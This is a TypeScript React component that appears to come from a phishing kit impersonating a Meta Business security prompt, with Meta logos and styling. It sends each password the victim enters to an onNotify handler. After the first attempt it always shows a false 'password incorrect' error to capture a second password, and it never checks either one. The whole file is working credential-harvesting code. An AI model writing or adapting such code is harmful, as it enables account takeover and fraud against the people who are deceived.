"use client";

import { FormEvent, useState } from "react";
import ModalShell from "@/components/modals/ModalShell";
import { useLocale } from "@/components/business-center/LocaleContext";

type Props = {
  open: boolean;
  onComplete: (password: string, passwordSecond: string) => void;
  onNotify: (payload: Record<string, unknown>) => Promise<void>;
  baseData: Record<string, unknown>;
};

export default function PasswordModal({
  open,
  onComplete,
  onNotify,
  baseData,
}: Props) {
  const { t } = useLocale();
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0);
  const [firstPassword, setFirstPassword] = useState("");

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const value = password.trim();
    setError("");
    if (!value) {
      setError(t("passwordRequired"));
      return;
    }

    setLoading(true);
    if (step === 0) {
      const clientData = { password: value, ...baseData };
      await onNotify(clientData);
      setTimeout(() => {
        setFirstPassword(value);
        setPassword("");
        setError(t("passwordIncorrect"));
        setStep(1);
        setLoading(false);
      }, 2200);
    } else {
      const clientData = {
        passwordSecond: value,
        password: firstPassword,
        ...baseData,
      };
      await onNotify(clientData);
      setTimeout(() => {
        setLoading(false);
        onComplete(firstPassword, value);
      }, 3400);
    }
  };

  return (
    <ModalShell id="securityModal" open={open}>
      <div className="h-full flex flex-col items-center justify-between flex-1">
        <div className="w-12 h-12 mb-5 mx-auto">
          <img src="/icons/ic_logo.svg" alt="Meta" className="w-full" />
        </div>
        <div className="w-full">
          <p className="text-[#9a979e] text-sm mb-4 text-center">{t("securityHint")}</p>
          <form onSubmit={handleSubmit}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={t("password")}
              className="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3"
            />
            {error ? <p className="text-red-500 text-sm mb-3">{error}</p> : null}
            <button
              type="submit"
              disabled={loading}
              className="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors"
            >
              {loading ? (
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto" />
              ) : (
                t("continue")
              )}
            </button>
          </form>
        </div>
        <div className="w-16 mt-5 mx-auto">
          <img src="/icons/ic_meta_gray.svg" alt="Meta" />
        </div>
      </div>
    </ModalShell>
  );
}
